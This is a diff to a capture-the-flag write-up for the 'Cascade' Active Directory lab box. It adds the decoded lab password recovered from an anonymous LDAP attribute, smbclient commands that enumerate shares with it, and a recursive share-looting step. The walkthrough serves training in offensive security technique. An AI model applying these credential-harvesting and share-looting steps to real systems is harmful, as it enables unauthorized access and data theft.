@@ -4,7 +4,7 @@
 **Difficulty:** Medium
 **Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery
 
-> **Status:** This writeup is complete up to the **initial foothold** (recovering `r.thompson`'s credentials from LDAP). The rest of the chain (SMB share looting -> `s.smith` -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
+> **Status:** This writeup is complete up to **foothold + share enumeration** (recovering `r.thompson`'s credentials from LDAP and listing SMB shares). The rest of the chain (share looting -> `s.smith` -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
 
 ---
 
@@ -127,7 +127,7 @@ The value is Base64:
 echo "clk0bjVldmE=" | base64 -d
 ```
 
--> yields `r.thompson`'s cleartext password. No bruteforce, no lockout risk - the credential was sitting in the directory readable by an anonymous bind.
+-> `rY4n5eva` - `r.thompson`'s cleartext password. No bruteforce, no lockout risk - the credential was sitting in the directory readable by an anonymous bind.
 
 ### Why not bruteforce?
 
@@ -136,10 +136,33 @@ The obvious-but-wrong instinct here is to bruteforce `r.thompson` over SMB with 
 ### Verify the credential
 
 ```bash
-nxc smb 10.129.84.52 -u 'r.thompson' -p '<decoded_password>'
+nxc smb 10.129.84.52 -u 'r.thompson' -p 'rY4n5eva'
 ```
 
 A `[+]` confirms the foothold.
+
+### Enumerate shares as `r.thompson`
+
+```bash
+smbclient -L //10.129.84.52 -U 'cascade.local\r.thompson%rY4n5eva'
+```
+
+```
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+Audit$          Disk
+C$              Disk      Default share
+Data            Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+print$          Disk      Printer Drivers
+SYSVOL          Disk      Logon server share
+```
+
+* The default/administrative shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `print$`, `SYSVOL`) are noise. The two **non-standard** shares - `Data` and `Audit$` - are the ones to chase.
+* `r.thompson` is in `IT` but **not** in `Remote Management Users`, so direct WinRM as this user is expected to fail - these creds are for reading shares, not for a shell.
+* The `Reconnecting with SMB1 ... NT_STATUS_RESOURCE_NAME_NOT_FOUND` line at the end is just `smbclient`'s legacy SMB1 workgroup-listing fallback failing - **cosmetic**, the share list above already came back over SMB2/3.
 
 ---
 
@@ -147,8 +170,7 @@ A `[+]` confirms the foothold.
 
 *Not executed in this run - documented as the intended path for when I continue the box.*
 
-- **Enumerate shares as `r.thompson`:** `nxc smb 10.129.84.52 -u r.thompson -p '<pw>' --shares`. `r.thompson` is in `IT` but **not** in `Remote Management Users`, so direct WinRM as this user likely fails - use the creds to read SMB shares.
-- **Loot the data/audit share** for material (notes, a config, a DB/exe) that leaks the next account, expected to lead toward `s.smith`.
+- **Loot the `Data` and `Audit$` shares** for material (notes, a config, a DB/exe) that leaks the next account, expected to lead toward `s.smith`. Connect with `smbclient //10.129.84.52/Data -U 'cascade.local\r.thompson%rY4n5eva'` and pull everything (`recurse ON; prompt OFF; mget *`).
 - **Pivot to `arksvc`**, which LDAP showed is a member of `CN=AD Recycle Bin` and `CN=Remote Management Users` - the Recycle Bin membership is the key to recovering deleted objects (and a higher-priv credential) via `Get-ADObject -IncludeDeletedObjects`.
 
 ---
@@ -162,8 +184,9 @@ A `[+]` confirms the foothold.
 | Wordlist | Extract usernames | grep |
 | LDAP enum | Anonymous bind, dump user objects | ldapsearch |
 | Loot | Spot non-standard `cascadeLegacyPwd` attribute on `r.thompson` | ldapsearch + grep |
-| Foothold | Base64-decode the stored password | base64 |
+| Foothold | Base64-decode the stored password (`rY4n5eva`) | base64 |
 | Verify | Confirm creds over SMB | NetExec (nxc) |
+| Share enum | List shares; spot non-standard `Data` + `Audit$` | smbclient |
 
 ---
 
